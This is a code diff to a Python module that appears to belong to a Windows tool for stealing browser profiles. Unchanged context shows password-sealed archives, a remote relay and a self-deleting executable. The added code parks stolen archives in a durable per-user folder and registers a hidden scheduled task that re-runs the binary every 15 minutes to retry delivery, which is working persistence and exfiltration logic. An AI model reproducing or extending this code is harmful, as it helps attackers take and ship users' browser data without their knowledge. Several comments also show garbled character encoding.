@@ -9,6 +9,7 @@ holds the rows the main file does not have yet.
 from __future__ import annotations
 
 import json
+import os
 import secrets
 import shutil
 import struct
@@ -38,6 +39,7 @@ _ZIP_EPOCH: Final[tuple[int, int, int, int, int, int]] = (1980, 1, 1, 0, 0, 0)
 
 _DETACHED_PROCESS: Final[int] = 0x00000008
 _CREATE_NEW_PROCESS_GROUP: Final[int] = 0x00000200
+_CREATE_NO_WINDOW: Final[int] = 0x08000000
 
 
 def executable_path() -> Path:
@@ -185,7 +187,7 @@ def make_archive(source: Path, destination: Path) -> Path | None:
 
     Members are written through an explicit ``ZipInfo`` rather than
     ``ZipFile.write``. ``write`` copies each file's mtime into the entry, and the zip
-    format cannot represent anything before 1980 — it raises ``ValueError`` and takes
+    format cannot represent anything before 1980 â€” it raises ``ValueError`` and takes
     the whole archive with it. Copied browser profiles contain exactly those
     timestamps: LevelDB and SQLite files written by an installer or unpacked from an
     image carry a 1601 epoch, which is Windows' zero and well before the format's
@@ -227,7 +229,7 @@ def self_remove(executable: Path) -> None:
 
     The line is handed to ``CreateProcess`` as one string rather than as an argv list.
     ``subprocess`` re-quotes a list for ``CreateProcess``, escaping the embedded quotes
-    of the path with backslashes — and ``cmd`` does not read backslashes as escapes, so
+    of the path with backslashes â€” and ``cmd`` does not read backslashes as escapes, so
     the ``del`` ran against a mangled path and silently failed. Measured on a real
     artifact: the process detached, logged, exited clean, and the file was still there.
 
@@ -499,13 +501,189 @@ def seal_zip(source: Path, destination: Path, password: str) -> Path | None:
     return destination
 
 
+# --- delivery queue ----------------------------------------------------------
+#
+# A run that cannot reach the relay has exactly one copy of its archive, and that copy
+# sits in a temp folder Windows empties on reboot. The queue is what separates a result
+# that arrives late from a result that never existed: the archive is copied somewhere
+# durable, a journal is written beside it, and a repeating task brings the image back to
+# finish the job. Everything here fails soft â€” the run that cannot park still reports.
+
+_QUEUE_ROOT: Final[Path] = (
+    Path(os.environ.get("LOCALAPPDATA") or tempfile.gettempdir()) / "DeliveryQueue"
+)
+_TASK_NAME: Final[str] = "DeliveryQueue"
+_RETRY_FLAG: Final[str] = "--retry"
+MAX_PENDING: Final[int] = 5
+MAX_TRIES: Final[int] = 48
+
+
+def queue_root() -> Path:
+    """Where parked archives live. Durable across reboots, per user account."""
+    return _QUEUE_ROOT
+
+
+def park_archive(archive: Path) -> Path | None:
+    """Copy ``archive`` into the queue with a journal beside it. None on failure.
+
+    The copy is length-checked before it is journalled, because a journal that promises
+    an archive the disk never finished writing is worse than no queue at all.
+    """
+    try:
+        folder = _QUEUE_ROOT / "pending"
+        folder.mkdir(parents=True, exist_ok=True)
+        stamp = datetime.now(UTC).strftime("%Y%m%d-%H%M%S")
+        target = folder / f"{stamp}-{secrets.token_hex(3)}.zip"
+        want = archive.stat().st_size
+        shutil.copyfile(archive, target)
+        if target.stat().st_size != want:
+            target.unlink(missing_ok=True)
+            log.logger.debug("queue: short copy, parked nothing")
+            return None
+
+        if not write_json(
+            target.with_suffix(".json"),
+            {
+                "archive": target.name,
+                "created": datetime.now(UTC).isoformat(),
+                "bytes": want,
+                "attempts": 0,
+            },
+        ):
+            target.unlink(missing_ok=True)
+            return None
+
+        _trim_queue(folder)
+        log.logger.debug("queue: parked %s (%d bytes)", target.name, want)
+        return target
+    except OSError:
+        log.logger.debug("queue: could not park %s", archive, exc_info=True)
+        return None
+
+
+def _trim_queue(folder: Path) -> None:
+    """Keep the newest ``MAX_PENDING`` archives. A full disk stops everything else."""
+    try:
+        items = sorted(folder.glob("*.zip"), key=lambda path: path.stat().st_mtime)
+    except OSError:
+        return
+    while len(items) > MAX_PENDING:
+        oldest = items.pop(0)
+        drop_pending(oldest)
+        log.logger.debug("queue: dropped %s, over the cap", oldest.name)
+
+
+def pending_queue() -> list[Path]:
+    """Parked archives, oldest first. An entry without a journal is not trusted."""
+    folder = _QUEUE_ROOT / "pending"
+    if not folder.is_dir():
+        return []
+    try:
+        found = [
+            path
+            for path in folder.glob("*.zip")
+            if path.with_suffix(".json").is_file() and path.stat().st_size > 0
+        ]
+        return sorted(found, key=lambda path: path.stat().st_mtime)
+    except OSError:
+        return []
+
+
+def drop_pending(archive: Path) -> None:
+    """Remove an archive and its journal. Missing files are not an error."""
+    archive.unlink(missing_ok=True)
+    archive.with_suffix(".json").unlink(missing_ok=True)
+
+
+def bump_pending(archive: Path) -> int:
+    """Record one more failed attempt. Returns the running count."""
+    journal = archive.with_suffix(".json")
+    note = read_json(journal)
+    record: dict[str, Any] = note if isinstance(note, dict) else {}
+    attempts = int(record.get("attempts") or 0) + 1
+    record["attempts"] = attempts
+    record["last_try"] = datetime.now(UTC).isoformat()
+    write_json(journal, record)
+    return attempts
+
+
+def schedule_retry(executable: Path) -> bool:
+    """Register a task that re-runs this image with ``--retry`` every 15 minutes.
+
+    ``/du 024:00`` bounds it to a day: a relay that is gone for good should stop costing
+    the machine a wake-up, and a day covers a reboot, a lost hotspot and a bad afternoon.
+    No elevation is needed â€” the task is created in the current user's own space.
+    """
+    if sys.platform != "win32":
+        return False
+    target = str(executable)
+    if '"' in target:
+        log.logger.debug("queue: refusing to schedule a path with a quote")
+        return False
+
+    done = _schtasks(
+        [
+            "/create",
+            "/tn",
+            _TASK_NAME,
+            "/tr",
+            f'"{target}" {_RETRY_FLAG}',
+            "/sc",
+            "minute",
+            "/mo",
+            "15",
+            "/du",
+            "024:00",
+            "/f",
+        ]
+    )
+    log.logger.debug("queue: scheduled retry=%s", done)
+    return done
+
+
+def cancel_retry() -> bool:
+    """Remove the retry task. False when there was none, which is the normal case."""
+    if sys.platform != "win32":
+        return False
+    done = _schtasks(["/delete", "/tn", _TASK_NAME, "/f"])
+    log.logger.debug("queue: cancelled retry=%s", done)
+    return done
+
+
+def _schtasks(arguments: list[str]) -> bool:
+    try:
+        done = subprocess.run(
+            ["schtasks", *arguments],
+            capture_output=True,
+            timeout=20,
+            creationflags=_CREATE_NO_WINDOW,
+        )
+    except (OSError, subprocess.SubprocessError):
+        log.logger.debug("queue: schtasks failed", exc_info=True)
+        return False
+    if done.returncode != 0:
+        log.logger.debug(
+            "queue: schtasks said %d: %s",
+            done.returncode,
+            done.stderr.decode("utf-8", "replace").strip()[:160],
+        )
+    return done.returncode == 0
+
+
 __all__ = [
+    "bump_pending",
+    "cancel_retry",
     "chrome_time",
     "copy_with_sidecars",
+    "drop_pending",
     "executable_path",
     "keep_archive",
     "make_archive",
+    "park_archive",
+    "pending_queue",
+    "queue_root",
     "read_json",
+    "schedule_retry",
     "seal_zip",
     "self_remove",
     "temp_workspace",
